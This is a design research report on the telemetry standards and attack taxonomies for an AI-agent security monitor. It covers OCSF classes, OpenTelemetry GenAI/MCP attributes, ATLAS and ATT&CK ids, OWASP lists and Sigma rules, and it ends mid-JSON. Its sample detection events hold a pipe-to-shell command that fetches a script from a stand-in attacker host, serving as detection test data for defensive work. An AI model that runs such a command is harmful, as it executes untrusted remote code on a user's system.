> **Historical design record.** Research report: the standards and schemas the event model and rules were aligned to (OCSF, OpenTelemetry GenAI conventions, MITRE ATT&CK and ATLAS, OWASP, Sigma, CEL).
>
> - Written on 2026-11-11, during design (the file was last modified 2026-11-11 17:11 UTC on the build machine; its title says "as of 2026-11-11").
> - Written before the project had a name. The text uses the placeholder `agentwatch` (rule ids `AW-...`, attribute prefix `aw.`; its legend says so); it is a placeholder, not this project's name or a product the report describes. The project was then called spoor and was renamed hawkbell on 2026-11-12 (commit d261f98).
> - Findings, numbers, plans and file names describe the design, the prototypes and the sources as they were then, not the release. For what the release does, read [docs/ASSUMPTIONS.md](../docs/ASSUMPTIONS.md) and [docs/LIMITATIONS.md](../docs/LIMITATIONS.md).
> - Local paths (`/home/user/...`, `/root/...`, `/tmp/claude-0/...`, `$S/...` for the session scratch directory, and work-directory variables the text defines) name directories on the build machine, a Linux sandbox VM. The scripts, outputs and downloaded sources in them are not in this repository.
> - Redactions: none.
> - Below the line the text is the original, unchanged except for the redactions listed. Other records cite these files by line number; such a number counts from the original's first line, which is line 12 of this file.

---

# Standards and schemas the event model and detections must align to (as of 2026-11-11)

**Executive summary**
1. OCSF stable is **v1.9.0 (2026-08-03)**; it already has `ai_agent`, `ai_model`, `message_context`, `delegation` and the `ai_operation` profile, but that profile is only registered on System/Network/Application/IAM classes, not on Findings or Discovery. `ai_capability` (MCP tool descriptor with rug-pull fingerprints) is only in 1.10.0-dev.
2. OTel GenAI conventions moved to `open-telemetry/semantic-conventions-genai` (since semconv v1.42.0); every `gen_ai.*`/`mcp.*` attribute is still **Development**, no schema URL, no release. Hand-rolled OTLP/HTTP JSON works: a minimal payload was accepted (HTTP 201) by Fluent Bit 5.2.0 in this session.
3. MITRE ATLAS is **content 2026.10 / format 6.1.0**; ATT&CK is **v20.1 (2026-11-05)**. ATT&CK v19+ revoked **T1562** (now T1685/T1686/T1690) and renamed Defense Evasion to Stealth; v20 adds T1698/T1699 prompt injection and T1700 AI-Enabled Exfiltration.
4. Sigma spec **v2.1.0** is realistic as the rule file format for single-event and correlation rules with a custom logsource; it has no ATLAS tag namespace and no agent taxonomy, and the Go libraries are stale, so we own the evaluator.
5. Recommendation: one compact NDJSON envelope; OTLP Body carries the whole envelope, OCSF mapping is by a type-to-class table with `unmapped` for residue. None of uber/ADR, agent-scan or agentshield emits OCSF or ATT&CK/ATLAS ids; agent-bom does, with wrong class ids.

Legend: **V** = verified against the primary source in this session, **U** = unverified (search snippet or memory). `agentwatch` and the `aw.` prefix are placeholders for the product name.

---

## 1. OCSF

**Version (V).** `ocsf/ocsf-schema` tag `v1.9.0`, `version.json` = `1.9.0`, CHANGELOG "v1.9.0 - Aug 3rd, 2026"; `main` is `1.10.0-dev`. Earlier: 1.8.0 2026-03-16, 1.7.0 2025-11-14.

**Base event required (V):** `activity_id, category_uid, class_uid, metadata{product, version}, severity_id, time, type_uid`. `type_uid = class_uid*100 + activity_id`. `time` is `timestamp_t` = epoch **milliseconds** (long). `severity_id`: 0 Unknown, 1 Informational, 2 Low, 3 Medium, 4 High, 5 Critical, 6 Fatal, 99 Other. `status_id`: 1 Success, 2 Failure. Category uids: system 1, findings 2, iam 3, network 4, discovery 5, application 6, remediation 7.

| Class | class_uid | Required beyond base (V) | activity_id |
|---|---|---|---|
| Process Activity | 1007 | `actor, device, process` | 1 Launch, 2 Terminate, 3 Open, 4 Inject, 5 Set User ID |
| File System Activity | 1001 | `actor, device, file{name,type_id}` | 1 Create, 2 Read, 3 Update, 4 Delete, 5 Rename, 6 Set Attributes ... 14 Open |
| Script Activity | 1009 | `actor, device, script` | 1 Execute |
| Network Activity | 4001 | at_least_one(`dst_endpoint`,`src_endpoint`) | 1 Open, 2 Close, 3 Reset, 4 Fail, 5 Refuse, 6 Traffic, 7 Listen |
| HTTP Activity | 4002 | at_least_one(`http_request`,`http_response`) | HTTP methods (3 Get, 6 Post ...) |
| Detection Finding | 2004 | `finding_info{uid}` | 1 Create, 2 Update, 3 Close |
| Compliance Finding | 2003 | `finding_info, compliance` (`status_id` 1 Pass, 2 Warning, 3 Fail) | same |
| Application Security Posture Finding | 2007 | at_least_one(`application, compliance, remediation, vulnerabilities`) | same |
| Device Inventory Info | 5001 | `device{type_id}` | 1 Log, 2 Collect |
| Software Inventory Info | 5020 | `device`; `package` is **deprecated since 1.4.0** in favour of `sbom{package{name,version}, software_components[]}` | 1 Log, 2 Collect |
| Application Lifecycle | 6002 | `activity_id`; at_least_one(`app`,`application`); `app` deprecated in 1.9.0 for `application` | 1 Install, 2 Remove, 3 Start, 4 Stop, 5 Restart, 6 Enable, 7 Disable, 8 Update |
| API Activity | 6003 | `actor, api{operation}, src_endpoint`; has `trace` profile | 1 Create, 2 Read, 3 Update, 4 Delete |

Deprecated, do not emit (V): Device Config State 5002 (use `compliance_finding`), `*_query` classes (use Live Evidence Info 5040), Security Finding 2001 (since 1.1.0).

**AI additions (V).**
- Profile `ai_operation` (added 1.8.0): `ai_model` (recommended), `ai_agent`, `message_context`, `delegation` (optional). Registered on base classes `system`, `network`, `application`, `iam`, and `email_activity`. **Not** on `finding` (profiles: `incident`) or `discovery`.
- `ai_agent` (1.9.0): `uid` (stable logical id), `name`, `version`, `instance_uid` (a conversation, session or run), `type_id` (0 Unknown, 1 Native, 2 LangChain, 3 AutoGen, 4 CrewAI, 99 Other), `ai_model`, `charter` (file: system prompt or constitution). Also attached to `process.ai_agent`, `process.hosted_ai_agent_list` (both gated on the `ai_operation` profile) and `evidences[].ai_agent` (not gated).
- `ai_model`: required `name`, `ai_provider`; recommended `version`.
- `message_context`: `uid` (session or conversation id), `ai_role_id` (1 User, 2 Assistant, 3 Tool, 4 Agent, 5 Orchestrator, 6 Retriever), `prompt_text`, `response_text`, token counts; at_least_one(`application`,`service`).
- `record_integrity` profile (1.9.0): `attestation_list` with fingerprint, signatures, `prev_event`, `chain_uid`; usable for tamper-evident sensor logs.
- **1.10.0-dev only:** `ai_capability` {`name` required; `type_id` 1 Tool, 2 Resource, 3 Prompt Template; `source_id` 1 MCP, 2 Function, 3 Built-in; `transport_id` 1 stdio, 2 Streamable HTTP, 3 HTTP+SSE; `service`; `transaction_uid` (JSON-RPC id); `is_destructive/is_readonly/is_idempotent/is_open_world`; `desc_fingerprint`, `input_schema_fingerprint`, `output_schema_fingerprint`, `baseline_fingerprint`} and `ai_status` {`stop_reason_id`, `permission_result_id` 1 Allowed, 2 Denied}.
- Pitfall (V): in 1.9.0 `evidences` `at_least_one` does not include `ai_agent` (fixed on main, PR #1796), so an evidence entry needs `process`, `actor`, `file`, `url` etc. as well.
- The Detection Finding description itself recommends modelling atomic alerts as the activity event plus the `security_control` profile (`action_id`, `disposition_id`, `attacks`, `is_alert`), keeping 2004 for findings with a lifecycle.

**Detection Finding, "agent executed a dangerous shell command"** (hand-checked against the v1.9.0 JSON files for required attributes, constraints and attribute names with a script; not run through the official validator):

```json
{"class_uid":2004,"class_name":"Detection Finding","category_uid":2,"category_name":"Findings",
 "activity_id":1,"activity_name":"Create","type_uid":200401,"time":1794355200123,
 "severity_id":4,"severity":"High","status_id":1,"status":"New","confidence_id":3,"is_alert":true,"risk_score":85,
 "action_id":1,"action":"Allowed","disposition_id":15,"disposition":"Detected",
 "message":"Claude Code ran a remote script piped into a shell (curl | bash)",
 "metadata":{"version":"1.9.0","uid":"01JCQ5Z8N3W7V9K2M4T6X8Y0AB",
   "correlation_uid":"3f6c1f0e-1111-4222-8333-444455556666","event_code":"detection",
   "log_name":"agentwatch.detection","profiles":["host","security_control"],
   "product":{"name":"agentwatch","vendor_name":"agentwatch","version":"0.1.0"}},
 "finding_info":{"uid":"det-01JCQ5Z8N3W7V9K2M4T6X8Y0AB",
   "title":"Agent tool call pipes remote content to a shell",
   "types":["agent.exec.pipe_to_shell"],"created_time":1794355200123,
   "data_sources":["hook:claude-code:PreToolUse"],
   "analytic":{"uid":"AW-EXEC-001","name":"pipe_to_shell","type_id":1,"type":"Rule","version":"3"},
   "attacks":[
     {"version":"ATT&CK v20.1","tactic":{"uid":"TA0002","name":"Execution"},
      "technique":{"uid":"T1059","name":"Command and Scripting Interpreter"},
      "sub_technique":{"uid":"T1059.004","name":"Unix Shell"}},
     {"version":"ATLAS 2026.10","tactic":{"uid":"AML.TA0005","name":"Execution"},
      "technique":{"uid":"AML.T0053","name":"AI Agent Tool Invocation"}}],
   "related_events":[{"uid":"01JCQ5Z8MZQ1E0R3S5U7W9Y1CD","type_uid":100701}]},
 "device":{"type_id":3,"type":"Laptop","hostname":"dev-mbp-042","uid":"6F1D2C3B-0000-4000-8000-ABCDEF012345",
   "os":{"name":"macOS","type_id":300,"version":"15.6"}},
 "evidences":[{"name":"tool_call_process",
   "process":{"pid":48213,"name":"bash","cmd_line":"bash -c 'curl -fsSL https://evil.example/x.sh | bash'",
     "file":{"name":"bash","type_id":1,"path":"/bin/bash"},"user":{"name":"alice","uid":"501"},
     "parent_process":{"pid":48120,"name":"claude","cmd_line":"claude"}},
   "ai_agent":{"uid":"claude-code","name":"Claude Code","type_id":1,"type":"Native","version":"2.1.0",
     "instance_uid":"3f6c1f0e-1111-4222-8333-444455556666",
     "ai_model":{"name":"claude-sonnet-4-5","ai_provider":"Anthropic"}},
   "url":{"url_string":"https://evil.example/x.sh","hostname":"evil.example"}}],
 "unmapped":{"gen_ai.operation.name":"execute_tool","gen_ai.tool.name":"Bash",
   "gen_ai.tool.call.id":"toolu_01ABC","owasp_agentic":["ASI02","ASI05"]}}
```

**Inventory, "MCP server discovered"** (Software Inventory Info 5020; same hand-check). MCP specifics have no 1.9.0 home and go in `unmapped`, named after the 1.10-dev `ai_capability` fields so they can move later:

```json
{"class_uid":5020,"class_name":"Software Inventory Info","category_uid":5,"category_name":"Discovery",
 "activity_id":2,"activity_name":"Collect","type_uid":502002,"time":1794355200123,
 "severity_id":1,"severity":"Informational",
 "message":"MCP server 'filesystem' configured for Claude Code (user scope)",
 "metadata":{"version":"1.9.0","uid":"01JCQ60A4T1B2C3D4E5F6G7H8J","event_code":"inventory.mcp_server",
   "log_name":"agentwatch.inventory","profiles":["host"],
   "product":{"name":"agentwatch","vendor_name":"agentwatch","version":"0.1.0"}},
 "device":{"type_id":3,"type":"Laptop","hostname":"dev-mbp-042","uid":"6F1D2C3B-0000-4000-8000-ABCDEF012345",
   "os":{"name":"macOS","type_id":300,"version":"15.6"}},
 "actor":{"user":{"name":"alice","uid":"501"}},
 "sbom":{"type_id":2,"type":"CycloneDX",
   "package":{"name":"@modelcontextprotocol/server-filesystem","version":"2026.1.14","type_id":1,
     "package_manager":"npm","purl":"pkg:npm/%40modelcontextprotocol/server-filesystem@2026.1.14",
     "hash":{"algorithm_id":3,"algorithm":"SHA-256","value":"9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08"}},
   "software_components":[{"name":"@modelcontextprotocol/sdk","version":"1.20.0","type_id":2,"type":"Library"}]},
 "unmapped":{"inventory_kind":"mcp_server","mcp":{"server_name":"filesystem","client":"claude-code","scope":"user",
   "config_path":"/Users/alice/.claude.json","config_sha256":"2c26b4...","transport":"stdio","command":"npx",
   "args":["-y","@modelcontextprotocol/server-filesystem","/Users/alice/src"],"env_keys":[],"pinned":false,
   "tools_fingerprint":"sha256:fcde2b..."}}}
```
`package.version` is required, so an unpinned `npx -y pkg` needs a resolved version or the literal `"unknown"`. Use 6002 Application Lifecycle (Install 1, Update 8, Remove 2, Enable 6, Disable 7) for *changes*; it carries the `ai_operation` profile, and 1.10-dev explicitly redefines `ai_agent` on 6002 as "the affected application when that application is itself an AI agent".

---

## 2. OpenTelemetry GenAI and MCP conventions, OTLP/HTTP JSON

**Status (V).** `open-telemetry/semantic-conventions` v1.45.0 `docs/gen-ai/README.md` is a "Moved" stub; the move is recorded under v1.42.0. The new repo's `docs/gen-ai/README.md` says **Status: Development**, README "Schema URL: TODO", CHANGELOG "Unreleased" only. `gen_ai.system` no longer exists in the registry (0 matches); use `gen_ai.provider.name`. Model files use Weaver `file_format: definition/2`.

**`gen_ai.operation.name` values (V):** `chat, generate_content, realtime_inference, user_speech, text_completion, embeddings, retrieval, fetch_response, create_agent, invoke_agent, execute_tool, invoke_workflow, invoke_runner, plan, search_memory, create_memory, update_memory, upsert_memory, delete_memory, create_memory_store, delete_memory_store`.

**Agent and tool attributes (V, all Development):**
- `gen_ai.agent.id` (stable provider-assigned id; in-memory or session ids are "NOT RECOMMENDED"), `gen_ai.agent.name` (must be low cardinality), `gen_ai.agent.description`, `gen_ai.agent.version`; `gen_ai.main_agent.id|name|description`.
- `gen_ai.conversation.id` (session or thread; the only attribute designated for cross-span propagation), `gen_ai.conversation.compacted`.
- `gen_ai.tool.name`, `gen_ai.tool.call.id`, `gen_ai.tool.type` (`function`, `extension`, `datastore`), `gen_ai.tool.description`, `gen_ai.tool.call.arguments`, `gen_ai.tool.call.result` (both opt-in, "may contain sensitive information"), `gen_ai.tool.definitions`.
- `gen_ai.skill.name`, `gen_ai.skill.description`, `gen_ai.skill.source.uri`, `gen_ai.skill.resource.name`; `gen_ai.transfer.mode` (`return_to_caller`, `pass_control`), `gen_ai.transfer.target.name`.
- `gen_ai.provider.name` (`anthropic`, `openai`, `gcp.gemini`, `aws.bedrock`, `azure.ai.openai`, `ollama`, ...), `gen_ai.request.model`, `gen_ai.response.model`, `gen_ai.usage.input_tokens|output_tokens`, `gen_ai.memory.*`.
- Spans: `invoke_agent {gen_ai.agent.name}` (INTERNAL in-process, CLIENT remote); `execute_tool {gen_ai.tool.name}` (INTERNAL; required `gen_ai.operation.name`, `gen_ai.tool.name`). Refinement `gen_ai.execute_tool.command` adds `process.executable.name`, `process.executable.path`, `process.exit.code`; refinements also exist for `load_skill` and `read_skill_resource`.
- Events: `gen_ai.client.inference.operation.details`, `gen_ai.evaluation.result`, `gen_ai.execute_tool.exception`, `gen_ai.invoke_agent.exception`.

**MCP (V, Development):** `mcp.method.name` (required; `initialize`, `tools/list`, `tools/call`, `resources/read`, `prompts/get`, `sampling/createMessage`, `elicitation/create`, `notifications/tools/list_changed`, ...), `mcp.session.id`, `mcp.protocol.version` (e.g. `2025-06-18`), `mcp.resource.uri`, `jsonrpc.request.id`, `jsonrpc.protocol.version`. Spans `mcp.client`/`mcp.server` named `{mcp.method.name} {target}` and carrying `gen_ai.tool.name` plus `gen_ai.operation.name=execute_tool`. Transport: stdio is `network.transport=pipe`; Streamable HTTP is `tcp` + `network.protocol.name=http`. There is no attribute for the MCP **server name**; we need our own.

Useful core attributes (v1.45.0, V): `process.pid, process.parent_pid, process.executable.name|path, process.command_line, process.working_directory, process.creation.time, process.exit.code, process.user.name`; `host.id, host.name, host.arch, os.type, os.version`; `user.id, user.name`; `file.path, file.name`; `security_rule.name|uuid|version|category|description|reference|ruleset.name`; `log.record.uid`, `log.record.original`; `session.id`. There is no `threat.*` namespace.

Claude Code's own telemetry (V, `code.claude.com/docs/en/monitoring-usage.md`) uses `claude_code.*` event names (`tool_result`, `tool_decision`, `user_prompt`, `api_request`) with `tool_name`, `tool_use_id`, `session.id`, `prompt.id`, `event.sequence`; `gen_ai.*` appears only on its trace spans: `gen_ai.system` (always `anthropic`; a name the current registry no longer defines, which shows the churn), `gen_ai.request.model`, `gen_ai.response.id`, `gen_ai.response.finish_reasons`, and `gen_ai.tool.call.id`, which equals `tool_use_id` and matches hook payloads. Our normalizer must therefore map `claude_code.*` to `gen_ai.*`.

**OTLP/HTTP JSON rules** (V, `opentelemetry-proto` `docs/specification.md`, proto v1.11.1 2026-09-25):
- `POST /v1/logs`, `Content-Type: application/json`, optional `Content-Encoding: gzip`, default port 4318. Body is `ExportLogsServiceRequest`: `resourceLogs[].scopeLogs[].logRecords[]`.
- Keys are **lowerCamelCase**; snake_case is invalid.
- 64-bit integers (`timeUnixNano`, `observedTimeUnixNano`, `intValue`) are decimal **strings**; receivers accept numbers too. Timestamps are integers, not RFC 3339.
- `traceId` (32 hex chars) and `spanId` (16 hex chars) are hex, case-insensitive, never base64.
- Enums are **integers only** (`severityNumber`: 1-4 TRACE, 5-8 DEBUG, 9-12 INFO, 13-16 WARN, 17-20 ERROR, 21-24 FATAL).
- `AnyValue` is exactly one of `stringValue, boolValue, intValue, doubleValue, arrayValue{values[]}, kvlistValue{values[{key,value}]}, bytesValue` (base64).
- `eventName` (LogRecord field 12, since v1.5.0) marks the record as an event.
- Success is HTTP 200 with `{}` or `partialSuccess{rejectedLogRecords,errorMessage}`. Retry only 429/502/503/504 and honour `Retry-After`; never retry 400. Recommended request cap 64 MiB.

**Minimal payload, tested in this session against `fluent/fluent-bit` v5.2.0 (`-i opentelemetry -o stdout`): HTTP 201.**

```json
{"resourceLogs":[{"resource":{"attributes":[
  {"key":"service.name","value":{"stringValue":"agentwatch-sensor"}},
  {"key":"service.version","value":{"stringValue":"0.1.0"}},
  {"key":"host.name","value":{"stringValue":"dev-mbp-042"}},
  {"key":"host.id","value":{"stringValue":"6F1D2C3B-0000-4000-8000-ABCDEF012345"}},
  {"key":"os.type","value":{"stringValue":"darwin"}}]},
 "scopeLogs":[{"scope":{"name":"agentwatch.sensor","version":"0.1.0"},"logRecords":[{
  "timeUnixNano":"1794355200123000000","observedTimeUnixNano":"1794355200125000000",
  "severityNumber":17,"severityText":"ERROR","eventName":"agentwatch.detection",
  "traceId":"5b8efff798038103d269b633813fc60c","spanId":"eee19b7ec3c1b174",
  "body":{"kvlistValue":{"values":[
    {"key":"rule_id","value":{"stringValue":"AW-EXEC-001"}},
    {"key":"cmd","value":{"stringValue":"curl -fsSL https://evil.example/x.sh | bash"}}]}},
  "attributes":[
    {"key":"gen_ai.operation.name","value":{"stringValue":"execute_tool"}},
    {"key":"gen_ai.tool.name","value":{"stringValue":"Bash"}},
    {"key":"gen_ai.tool.call.id","value":{"stringValue":"toolu_01ABC"}},
    {"key":"gen_ai.agent.name","value":{"stringValue":"claude-code"}},
    {"key":"gen_ai.conversation.id","value":{"stringValue":"3f6c1f0e-1111-4222-8333-444455556666"}},
    {"key":"process.pid","value":{"intValue":"48213"}},
    {"key":"aw.risk_score","value":{"doubleValue":92.5}},
    {"key":"aw.attack.technique_ids","value":{"arrayValue":{"values":[
      {"stringValue":"T1059.004"},{"stringValue":"AML.T0053"}]}}}]}]}]}]}
```

Observed Fluent Bit behaviour (V):
- Success code is **201** by default (`successful_response_code`), so clients must accept any 2xx.
- A `kvlistValue` body is flattened into top-level record keys; a `stringValue` body becomes the key `log`.
- Record attributes, severity, `event_name`, trace and span ids land in metadata (`otlp.*`), resource and scope in group attributes. Non-OTLP outputs mostly serialize the record body (inference), so detection-relevant data must be in the Body.
- `trace_id`/`span_id` are stored as raw bytes and print as garbage in JSON stdout.
- snake_case keys return **400** (`FLB_OTEL_LOGS_ERR_RESOURCELOGS_MISSING`). A string enum `"SEVERITY_NUMBER_INFO"` is accepted but passed through as a string, so always send integers.

---

## 3. MITRE ATLAS

**Version (V).** `mitre-atlas/atlas-data` `dist/v6/ATLAS-2026.10.yaml`: `collection.version: '2026.10'`, `format-version: 6.1.0`, released 2026-10-28. Content version (YYYY.MM, monthly) and format version have been separate since 2026.05; `dist/ATLAS.yaml` is frozen at 5.6.0. Totals: 16 tactics, 221 technique and sub-technique objects, 44 mitigations. Techniques carry `platforms` (`Agentic AI`, ...) and `maturity`.

Agent-relevant ids (V, names verbatim):
- Prompt injection: `AML.T0051` LLM Prompt Injection, `.000` Direct, `.001` Indirect, `.002` Triggered; `AML.T0054` LLM Jailbreak; `AML.T0068` LLM Prompt Obfuscation; `AML.T0093` Prompt Infiltration via Public-Facing Application; `AML.T0094` Delay Execution of LLM Instructions; `AML.T0061` LLM Prompt Self-Replication; `AML.T0143` LLM Prompt Propagation.
- Tool abuse: `AML.T0053` AI Agent Tool Invocation; `AML.T0086` Exfiltration via AI Agent Tool Invocation; `AML.T0101` Data Destruction via AI Agent Tool Invocation; `AML.T0098` AI Agent Tool Credential Harvesting; `AML.T0085.001` Data from AI Services: AI Agent Tools; `AML.T0100` AI Agent Clickbait.
- Context and memory: `AML.T0080` AI Agent Context Poisoning, `.000` Memory, `.001` Thread; `AML.T0092` Manipulate User LLM Chat History; `AML.T0085.002` Conversation Context and Memory; `AML.T0085.003` System Instructions.
- Configuration: `AML.T0081` Modify AI Agent Configuration; `AML.T0083` Credentials from AI Agent Configuration; `AML.T0084` Discover AI Agent Configuration (`.000` Embedded Knowledge, `.001` Tool Definitions, `.002` Activation Triggers, `.003` Call Chains); `AML.T0133` Discover AI Agent Runtime Capabilities; `AML.T0002.002` AI Agent Configuration (acquire).
- Supply chain and tool poisoning: `AML.T0010.005` Supply Chain Compromise: AI Agent Tool; `AML.T0011.002` Poisoned AI Agent Tool; `AML.T0109` AI Supply Chain Rug Pull; `AML.T0110` AI Agent Tool Poisoning (`.000` Definition and Instructions, `.001` Implementation, `.002` Runtime Response); `AML.T0099` AI Agent Tool Data Poisoning; `AML.T0111` AI Supply Chain Reputation Inflation; `AML.T0115.002` Publish Poisoned AI Artifacts: AI Agent Tools; `AML.T0060` Publish Hallucinated Entities.
- Host and C2: `AML.T0112.000` Machine Compromise: Local AI Agent; `AML.T0103` Deploy AI Agent; `AML.T0108` AI Agent (C2); `AML.T0096` AI Service API (C2); `AML.T0050` Command and Scripting Interpreter; `AML.T0055` Unsecured Credentials; `AML.T0138` Indicator Removal; `AML.T0034.002` Agentic Resource Consumption; `AML.T0077` LLM Response Rendering; `AML.T0025` Exfiltration via Cyber Means.
- Mitigations: `AML.M0024` AI Telemetry Logging and Monitoring; `AML.M0028` Enforce Access Controls for AI Agent Tools; `AML.M0029` Human In-the-Loop for AI Agent Actions; `AML.M0030` Restrict AI Agent Tool Invocation on Untrusted Data; `AML.M0038` AI Agent Scope Drift Detection; `AML.M0043` AI Agent External Resource Lifecycle Management.
- **Removed ids:** `AML.T0056`, `AML.T0057`, `AML.T0019`, `AML.T0024.000` are absent in 2026.10 (T0056 moved to T0085.003, T0057 to T0085.002). agent-bom still uses T0056/T0057.

## 4. OWASP

**Top 10 for Agentic Applications 2026 (ASI), released December 2025.** U: `genai.owasp.org` is not reachable from this session (it would have to be allowed in the session's network settings); names come from search snippets that agree with each other: ASI01 Agent Goal Hijack; ASI02 Tool Misuse and Exploitation; ASI03 Identity and Privilege Abuse; ASI04 Agentic Supply Chain Vulnerabilities; ASI05 Unexpected Code Execution (RCE); ASI06 Memory & Context Poisoning; ASI07 Insecure Inter-Agent Communication; ASI08 Cascading Failures; ASI09 Human-Agent Trust Exploitation; ASI10 Rogue Agents.

**OWASP MCP Top 10** (V, `OWASP/www-project-mcp-top-10` `index.md`; still "Phase 3 - Beta Release and Pilot Testing"): MCP01:2025 Token Mismanagement & Secret Exposure; MCP02:2025 Privilege Escalation via Scope Creep; MCP03:2025 Tool Poisoning; MCP04:2025 Software Supply Chain Attacks & Dependency Tampering; MCP05:2025 Command Injection & Execution; MCP06:2025 Intent Flow Subversion (third parties still call it "Prompt Injection via Contextual Payloads"); MCP07:2025 Insufficient Authentication & Authorization; MCP08:2025 Lack of Audit and Telemetry; MCP09:2025 Shadow MCP Servers; MCP10:2025 Context Injection & Over-Sharing.

## 5. MITRE ATT&CK (Enterprise v20.1, 2026-11-05; V from `mitre-attack/attack-stix-data`)

**Breaking change.** New tactic **TA0112 Defense Impairment** (created 2026-04-14; v19.0 shipped 2026-04-28), TA0005 is now named **Stealth**. Revoked: `T1562` to `T1685` Disable or Modify Tools; `T1562.003` to `T1690` Prevent Command History Logging; `T1562.004` to `T1686`; `T1562.012` to `T1685.004`; `T1070.002` to `T1685.006` Clear Linux or Mac System Logs; `T1070.001` to `T1685.005`. New AI techniques: `T1698` Indirect Prompt Injection, `T1699` Direct Prompt Injection, `T1700` AI-Enabled Exfiltration, `T1608.007` AI Result Poisoning, `T1685.007` Impair Autonomous Defenses, `T1027.018` Invisible Unicode, `T1682` Query Public AI Services. `T1195.004`/`.005` do not exist.

Ids for coding-agent misuse (all present and not revoked):
- Execution: `T1059` (.001 PowerShell, .002 AppleScript, .003 Windows Command Shell, .004 Unix Shell, .006 Python, .007 JavaScript, .013 Container CLI/API), `T1204.005` Malicious Library, `T1677` Poisoned Pipeline Execution, `T1609`, `T1698`, `T1699`.
- Persistence: `T1546.004` Unix Shell Configuration Modification, `T1053.003` Cron, `T1053.005` Scheduled Task, `T1543.001` Launch Agent, `T1543.002` Systemd Service, `T1547.001`, `T1098.004` SSH Authorized Keys, `T1176.002` IDE Extensions.
- Credential access: `T1552.001` Credentials In Files, `.003` Shell History, `.004` Private Keys, `.005` Cloud Instance Metadata API, `.007` Container API; `T1555.001` Keychain, `.003` Web Browsers, `.005` Password Managers; `T1528`; `T1539`.
- Discovery and collection: `T1083`, `T1082`, `T1057`, `T1518.001`, `T1005`, `T1213.003` Code Repositories, `T1119`, `T1560.001`, `T1074`.
- C2 and exfiltration: `T1105` Ingress Tool Transfer, `T1071.001`, `T1071.004`, `T1572`, `T1090`, `T1041`, `T1048` (.001-.003), `T1567` (.001 Code Repository, .002 Cloud Storage, .003 Text Storage Sites, .004 Webhook), `T1537`, `T1700`.
- Stealth: `T1070` (.003 Clear Command History, .004 File Deletion, .006 Timestomp), `T1027` (+`.018`), `T1140`, `T1036.005`, `T1564.001`, `T1218`, `T1574.006`.
- Defense Impairment: `T1685` (+.004, .006, .007), `T1686`, `T1690`, `T1222.002`.
- Supply chain, privilege, impact: `T1195.001`, `T1195.002`; `T1548.001`, `T1548.003`, `T1611`, `T1068`; `T1485`, `T1486`, `T1490`, `T1496.001`, `T1565.001`.

## 6. Sigma and rule-engine options

**Sigma v2.1.0, 2025-08-02 (V).** Required: `title`, `logsource` (`category`/`product`/`service`/`definition`), `detection` (search identifiers as maps = AND, lists = OR, plus `condition`). Optional: `id` (UUID), `status`, `level` (`informational|low|medium|high|critical`), `tags`, `falsepositives`, `fields`, `taxonomy`, `scope`, and arbitrary custom fields. Condition grammar: `and`, `or`, `not`, parentheses, `1 of selection*`, `all of them`. Matching is case-insensitive with `*`/`?` wildcards.

Modifiers: `contains, startswith, endswith, all, exists, cased, neq, re` (+`i|m|s`), `base64, base64offset, utf16le|utf16be|utf16|wide, windash, lt, lte, gt, gte, cidr, expand, fieldref`, and time parts (`minute, hour, day, week, month, year`).

Correlation rules: `event_count, value_count, temporal, temporal_ordered, value_sum, value_avg, value_percentile` with `rules`, `group-by`, `timespan`, `condition{gte: N}`. Tag namespaces: `attack, car, cve, d3fend, detection, stp, tlp`. There is **no `atlas` namespace** and no agent, LLM or MCP logsource in the taxonomy appendix (0 matches).

**Is it realistic? Yes, with caveats.**
- Use our own logsource (`product: agentwatch`, `category: agent_tool_call | agent_inventory | mcp_request | agent_file_access | ...`) and declare `taxonomy: agentwatch`.
- Tag `attack.t1059.004`, plus custom nested namespaces `atlas.aml.t0053`, `owasp.asi02`, `owasp.mcp05`.
- Expose Sysmon-style aliases (`Image, CommandLine, ParentImage, ParentCommandLine, User, CurrentDirectory`) on `proc` events so the existing SigmaHQ `process_creation` corpus for linux/macos/windows runs unmodified.
- `temporal_ordered` with `group-by: [agent.session]` expresses "secret read, then egress, in one session".
- Sigma cannot express arithmetic, computed fields or baseline state (rug-pull drift, first-seen), so add an escape hatch (`x-cel:`) and built-in stateful detectors.

Go libraries (V via proxy.golang.org and READMEs): `bradleyjkemp/sigma-go` v0.6.6 (2024-09; its modifier table has contains/startswith/endswith/re/cidr/gt/gte/lt/lte/base64 and none of windash, base64offset, exists, fieldref, cased); `runreveal/sigmalite` (no tagged release, last commit 2025-09; all/cidr/contains/endswith/expand/re/startswith/windash/base64/base64offset and a `FieldResolver` for nested fields); `markuskont/go-sigma-rule-engine` v0.3.0 (2022). Correlation support in any of them is unverified. Plan to own a small evaluator of roughly 1k lines.

Alternatives: **CEL** (`google/cel-go` v0.30.0, 2026-07) is typed, non-Turing-complete, cost-bounded and suited to per-event predicates on an endpoint; **expr** (`expr-lang/expr` v1.17.8, 2026-02) is lighter and faster to adopt but not a cross-language standard; **Rego** (`open-policy-agent/opa` v1.22.3, 2026-11-10) fits posture and policy bundles on the server but is heavy for a sensor binary.

Falco rule (V): a YAML list item `- rule: X` / `desc:` / `condition: open_read and sensitive_files and not proc.name in (...)` / `output: "... file=%fd.name command=%proc.cmdline"` / `priority: WARNING` / `tags: [...]`, plus reusable `- macro:` and `- list:` items.
Tetragon (V, v1.8.0): a Kubernetes CRD, `apiVersion: cilium.io/v1alpha1`, `kind: TracingPolicy`, `spec.kprobes[] {call: "security_file_permission", syscall: false, args: [{index: 0, type: "file"}], selectors: [{matchArgs: [{index: 0, operator: "Prefix", values: ["/etc/"]}]}]}`, with optional `matchActions` such as Sigkill (U, from memory). Both are kernel-event formats and are not portable to macOS or Windows.

## 7. ECS

ECS (V, `elastic/ecs`): latest release 9.5.0, `main` 9.6.0-dev. The `gen_ai` field set was added as **beta** in 9.1.0 and mirrors OTel with 33 fields: `gen_ai.agent.{id,name,description}`, `gen_ai.conversation.id`, `gen_ai.operation.name`, `gen_ai.provider.name`, `gen_ai.request.*`, `gen_ai.response.{id,model,finish_reasons}`, `gen_ai.tool.{name,type,call.id,call.arguments,call.result,definitions}`, `gen_ai.usage.{input_tokens,output_tokens}`, `gen_ai.{system_instructions,input.messages,output.messages}` (flattened), `gen_ai.token.type`. No `mcp.*`, no skill or memory fields. Using OTel names in our attributes gives ECS compatibility for free; findings map to `rule.*`, `threat.technique.id`, `event.kind: alert`.

---

## 8. Recommended native envelope (NDJSON, one event per line)

```json
{"v":1,"id":"01JCQ5Z8MZQ1E0R3S5U7W9Y1CD","ts":"2026-11-11T00:00:00.123456789Z",
 "kind":"activity","type":"tool.call","sev":1,"outcome":"success",
